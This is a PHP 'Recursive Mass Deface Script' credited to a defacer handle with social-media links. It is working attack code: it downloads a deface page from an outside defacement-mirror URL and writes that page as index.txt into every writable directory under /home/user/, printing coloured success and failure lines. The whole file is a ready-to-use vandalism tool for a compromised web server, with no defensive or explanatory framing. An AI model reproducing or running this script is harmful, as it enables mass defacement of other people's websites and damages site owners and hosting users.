<?php

/**
 * Recursive Mass Deface Script
 * by L4663r666h05t
 * x.com/L4663r666h05t
 * umbra.by/L4663r666h05t
 * t.me/laggergod
 * laggerghost.wordpress.com
 */

$target_root = "/home/user/";
$filename    = "index.txt"; // The name of the file to be created
$source_url  = "https://zonehmirrors.org/defaced/2026/02/02/tiles.pro-linuxpl.com/tiles.pro-linuxpl.com/index.txt";

$script_content = file_get_contents($source_url);

if (!$script_content) {
    die("Error: Could not fetch content from the source URL.");
}

/**
 * Mass deface function to spread the file across all directories
 */

function recursive_mass_deface($dir, $name, $content) {
    if (is_writable($dir)) {
        $items = scandir($dir);
        
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;

            $full_path = $dir . DIRECTORY_SEPARATOR . $item;

            if (is_dir($full_path)) {
                $target_file = $full_path . DIRECTORY_SEPARATOR . $name;

                if (is_writable($full_path)) {
                    if (file_put_contents($target_file, $content)) {
                        echo "[<font color=lime>SUCCESS</font>] Created: $target_file<br>";
                    } else {
                        echo "[<font color=red>FAILED</font>] Writing error: $target_file<br>";
                    }

                    recursive_mass_deface($full_path, $name, $content);
                } else {
                    echo "[<font color=orange>SKIPPED</font>] No permission: $full_path<br>";
                }
            }
        }
    } else {
        echo "[<font color=red>ERROR</font>] Root directory is not writable: $dir<br>";
    }
}

echo "<b>Starting Mass Deface...</b><br><br>";
recursive_mass_deface($target_root, $filename, $script_content);
echo "<br><b>Operation Completed.</b>";
?>
